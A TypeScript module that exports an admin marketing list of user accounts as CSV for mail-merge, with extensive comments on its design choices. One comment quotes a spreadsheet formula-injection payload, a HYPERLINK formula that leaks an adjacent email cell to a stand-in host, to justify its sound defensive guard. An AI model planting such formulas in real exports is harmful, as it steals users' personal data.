/**
 * The marketing list, as a file — app/(dashboard)/admin/marketing/csv.ts
 *
 * WHY THE CSV IS BUILT IN THE BROWSER AND NOT ON THE SERVER. The owner mails these people by
 * hand, so the export exists to be opened in a spreadsheet and mail-merged. The rows it
 * contains must be EXACTLY the rows on screen — same search, same segment filter, same
 * order — and the only way to guarantee that is to write the file from the array the table
 * just rendered. A second serialiser on the server would be a second decision about what "the
 * list" means, and the day it disagreed with the table the file would be silently wrong: a
 * download that quietly covered only the first page, or included accounts the operator had
 * just filtered out, is worse than no export at all because it looks right.
 *
 * It also avoids handing an admin token to a plain `<a href>` download, which cannot carry an
 * Authorization header and would therefore need the list to be reachable without one.
 *
 * Everything here is pure string work so it can be tested in the node environment vitest
 * runs in. The only browser-shaped part — the Blob and the object URL — stays in the page,
 * where there is nothing left to get wrong.
 */

/** One account, exactly as `GET /api/v1/admin/marketing` returns it. */
export interface MarketingRow {
  user_id: string;
  email: string;
  full_name: string | null;
  joined_at: string;
  is_active: boolean;
  is_admin: boolean;
  /** Operator account: not metered, so `remaining` means nothing for it. */
  unlimited: boolean;
  /** Feature id → how many of it this account may still start. */
  remaining: Record<string, number>;
  sessions_started: number;
  sessions_completed: number;
  reports: number;
  /** Reports that actually carry a score. A row is written even when scoring fails. */
  scored_reports: number;
  /** Their best scored report, 0-100, or null. Never negative — see FORMULA_LEADERS. */
  best_score: number | null;
  last_active_at: string | null;
  ever_paid: boolean;
  last_paid_at: string | null;
  /** How many purchases. Never a rupee total — /admin/revenue owns the money figure. */
  purchases: number;
  /** What this account thinks of US, averaged over the interviews they rated, or null. */
  avg_stars: number | null;
  /** How many interviews they rated. One one-star is not five one-stars. */
  ratings_given: number;
  segment: string;
}

export interface MarketingFeature {
  feature: string;
  label: string;
}

export interface MarketingSegment {
  segment: string;
  label: string;
  /**
   * What this account actually DID, in the past tense.
   *
   * Served rather than written in the UI so the screen cannot describe a segment differently
   * from the rule that assigns it — see `_SEGMENTS` in backend/app/api/v1/admin.py.
   */
  what_happened: string;
  pitch: string;
  count: number;
}

export interface MarketingListResponse {
  generated_at: string;
  total: number;
  returned: number;
  truncated: boolean;
  features: MarketingFeature[];
  segments: MarketingSegment[];
  users: MarketingRow[];
}

/**
 * RFC 4180 line ending, not `\n`.
 *
 * Excel on Windows is the likeliest thing to open this file and it treats a lone LF
 * inconsistently depending on version and locale — the failure mode being every row on one
 * line, which reads as a corrupt export rather than as a line-ending choice.
 */
const EOL = '\r\n';

/**
 * A UTF-8 byte-order mark, prepended to the downloaded file and NOT to the string this module
 * returns.
 *
 * Without it, Excel decodes the file in the system's legacy code page, and a name with any
 * character outside ASCII arrives mangled — which on a list of Indian students' names is not
 * a rare edge case. Kept out of `toCsv` so the tested output is the actual CSV content and
 * not content plus an invisible character every assertion has to know about.
 */
export const CSV_BOM = '﻿';

/**
 * Characters that turn a spreadsheet cell into a formula.
 *
 * THIS IS AN INJECTION GUARD, NOT COSMETIC. `full_name` is free text the user typed at signup,
 * and a name of `=HYPERLINK("http://evil/?"&A1,"click")` becomes a live formula the moment the
 * export is opened — exfiltrating the cell next to it, which here is somebody's email address.
 * Excel, Sheets and LibreOffice all do this, and none of them ask.
 *
 * The fix is a leading apostrophe, which every one of them reads as "this cell is text". It is
 * safe to apply to every column in THIS export because no value in it can legitimately begin
 * with one of these characters: the counts are non-negative integers, the balances are clamped
 * at zero server-side, the dates are ISO, and the flags are words. A column that could hold a
 * negative number would need this narrowed to the text fields.
 */
const FORMULA_LEADERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * One cell: neutralised, then quoted if it needs to be.
 *
 * Quoting is conditional rather than unconditional so the file stays readable in a terminal
 * and a diff, which is how anybody checks an export they do not trust.
 */
export function cell(value: string): string {
  let v = value ?? '';
  if (v.length > 0 && FORMULA_LEADERS.includes(v[0])) v = `'${v}`;

  // Leading/trailing spaces are quoted too: some readers strip them, and a name that renders
  // differently in the file than in the table invites "the export is wrong" for no reason.
  const needsQuotes = /[",\r\n]/.test(v) || v !== v.trim();
  return needsQuotes ? `"${v.replaceAll('"', '""')}"` : v;
}

/**
 * A date as the spreadsheet should see it: the UTC calendar day, or an empty cell.
 *
 * UTC AND ISO, DELIBERATELY. It sorts lexicographically, which is the only thing a spreadsheet
 * can be relied on to do with a date column, and it does not depend on the timezone of whoever
 * opened the file — two people exporting the same list must not get two different days.
 *
 * Empty rather than "never": an empty cell is what a spreadsheet's own filters understand as
 * missing, and a literal word would sort in among the real dates.
 */
export function isoDay(iso: string | null): string {
  if (!iso) return '';
  const d = new Date(iso);
  return Number.isNaN(d.getTime()) ? '' : d.toISOString().slice(0, 10);
}

/** `yes`/`no` rather than `true`/`false` — this file is read by a person writing an email. */
function yesNo(v: boolean): string {
  return v ? 'yes' : 'no';
}

/**
 * The whole list as CSV text.
 *
 * COLUMN ORDER IS THE ORDER SOMEBODY WRITING AN EMAIL NEEDS IT: who they are, what to say to
 * them, what they have left, then the evidence behind the segment. `segment_pitch` is carried
 * per row even though it is constant per segment, because it is what makes the file directly
 * mail-mergeable — the operator can write one template referencing it instead of keeping the
 * legend from this screen in his head.
 *
 * The feature columns are named from the server's own labels (`FEATURE_LABELS`, the same copy
 * the paywall message is built from), so a feature cannot be called one thing to a candidate
 * and another in the file. An admin row prints `unlimited` in them rather than a number,
 * because operator accounts are not metered at all and a figure there would be a lie.
 */
export function toCsv(
  rows: MarketingRow[],
  features: MarketingFeature[],
  segments: MarketingSegment[],
): string {
  const pitchOf = new Map(segments.map((s) => [s.segment, s.pitch]));

  const header = [
    'email',
    'name',
    'segment',
    'segment_pitch',
    ...features.map((f) => `${f.label} left`),
    'sessions_started',
    'sessions_completed',
    'reports',
    'scored_reports',
    'best_score',
    'ever_paid',
    'purchases',
    'avg_stars',
    'ratings_given',
    'last_paid',
    'last_active',
    'joined',
    'account_state',
  ];

  const lines = rows.map((r) =>
    [
      r.email,
      r.full_name ?? '',
      r.segment,
      pitchOf.get(r.segment) ?? '',
      ...features.map((f) =>
        r.unlimited ? 'unlimited' : String(r.remaining[f.feature] ?? 0),
      ),
      String(r.sessions_started),
      String(r.sessions_completed),
      String(r.reports),
      String(r.scored_reports),
      // Empty rather than a placeholder for "never scored": a spreadsheet can filter and
      // average an empty cell correctly and cannot do either with an em dash. Rounded, and
      // never negative, which is what keeps it clear of the formula-injection guard below.
      // `== null`, not `=== null`. The server types this `float | None` and always sends the
      // key, so `undefined` should be impossible — but "should be impossible" is exactly the
      // assumption a rolling deploy breaks, and the frontend goes out ahead of the backend.
      // Strict equality would miss `undefined` and fall through to the branch that calls
      // `.toFixed()` on it, which throws and white-screens the whole admin table. The loose
      // form costs nothing and turns a broken page into a dash.
      r.best_score == null ? '' : String(Math.round(r.best_score)),
      yesNo(r.ever_paid),
      String(r.purchases),
      // Empty rather than a placeholder for "never rated": a spreadsheet can filter and
      // average an empty cell and can do neither with an em dash. Never negative, which keeps
      // it clear of the formula-injection guard.
      r.avg_stars == null ? '' : String(r.avg_stars),
      String(r.ratings_given),
      isoDay(r.last_paid_at),
      isoDay(r.last_active_at),
      isoDay(r.joined_at),
      r.is_admin ? 'admin' : r.is_active ? 'active' : 'deactivated',
    ]
      .map(cell)
      .join(','),
  );

  // A trailing newline, so the last row is a complete line for anything reading this with a
  // line-oriented tool.
  return [header.map(cell).join(','), ...lines].join(EOL) + EOL;
}

/**
 * A filename that says what the file is and when it was taken.
 *
 * The date is in it because these get downloaded repeatedly as the drive approaches, and
 * `hotseat-marketing.csv (3)` in a downloads folder is three files nobody can tell apart —
 * while the whole point of the list is that it changes daily.
 */
export function csvFilename(now: Date, scope: string): string {
  const day = now.toISOString().slice(0, 10);
  const suffix = scope && scope !== 'all' ? `-${scope}` : '';
  return `hotseat-marketing-${day}${suffix}.csv`;
}
